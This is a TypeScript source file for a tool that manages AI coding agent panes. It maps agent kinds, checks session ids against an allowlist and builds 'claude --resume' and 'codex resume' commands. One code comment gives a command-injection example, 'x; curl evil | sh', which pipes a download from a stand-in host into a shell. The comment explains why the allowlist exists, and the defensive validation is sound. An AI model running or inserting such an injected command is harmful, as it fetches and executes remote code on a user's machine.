/**
 * Agent kind mapping, the session-id safety allowlist, and resume commands.
 * Spec: docs/current/agent-lifecycle.md §1.2, §6; workspace-feature.md §1.2.
 */

import type { AgentKind, PaneAgentState } from './types.js';

/**
 * Wire mapping for the optional `agent` field: absent or unrecognized → "claude"
 * (backwards compatible with pre-Codex CLIs); matching is case-insensitive.
 */
export function agentKindFromWire(raw: string | null | undefined): AgentKind {
    return raw?.toLowerCase() === 'codex' ? 'codex' : 'claude';
}

/** Display fallback for a pane that never saw an agent event. */
export function displayAgentKind(kind: AgentKind | null): AgentKind {
    return kind ?? 'claude';
}

const SAFE_SESSION_ID = /^[A-Za-z0-9._-]+$/;

/** Max session-id length accepted by the allowlist. */
export const MAX_SESSION_ID_LENGTH = 128;

/**
 * Session ids arrive over the local socket and are later TYPED INTO A SHELL
 * (resume-on-restart / reopen), so a hostile local sender could otherwise persist
 * `x; curl evil | sh`. Only ASCII alphanumerics plus `.` `_` `-`, length 1..128.
 */
export function isSafeSessionID(id: string): boolean {
    return id.length >= 1 && id.length <= MAX_SESSION_ID_LENGTH && SAFE_SESSION_ID.test(id);
}

/**
 * The command typed into a freshly spawned PTY to resume a session.
 * Returns null (resume silently skipped) when the id fails the allowlist.
 */
export function resumeCommand(kind: AgentKind, sessionID: string): string | null {
    if (!isSafeSessionID(sessionID)) return null;
    return kind === 'claude' ? `claude --resume ${sessionID}` : `codex resume ${sessionID}`;
}

export interface ResumeTuple {
    readonly paneID: string;
    readonly sessionID: string;
    readonly kind: AgentKind;
}

/**
 * §6.1 step 1: capture resume tuples BEFORE any clearing. Any pane holding a session id
 * is resumable regardless of its status; a null `agentKind` resumes as claude.
 */
export function captureResumeTuple(paneID: string, state: PaneAgentState): ResumeTuple | null {
    if (state.agentSessionID === null) return null;
    return { paneID, sessionID: state.agentSessionID, kind: displayAgentKind(state.agentKind) };
}

/**
 * §6.1 step 2: clear the session id and reset a non-idle status (status is tied to a live
 * PTY). `agentKind` is deliberately preserved - it is the last-known display value and the
 * resume tuples already captured it.
 */
export function resetPaneAgentStateOnLoad(state: PaneAgentState): PaneAgentState {
    return {
        status: 'idle',
        agentSessionID: null,
        agentKind: state.agentKind,
        agentStartedAt: null,
        backgroundTaskCount: 0
    };
}

/** §6.1 step 4 / §6.2: settle delay between spawning a surface and typing the resume. */
export const RESUME_SETTLE_DELAY_MS = 2000;

/** Quit / delete gates count every pane whose status is not idle. */
export function isActiveAgentStatus(status: PaneAgentState['status']): boolean {
    return status !== 'idle';
}
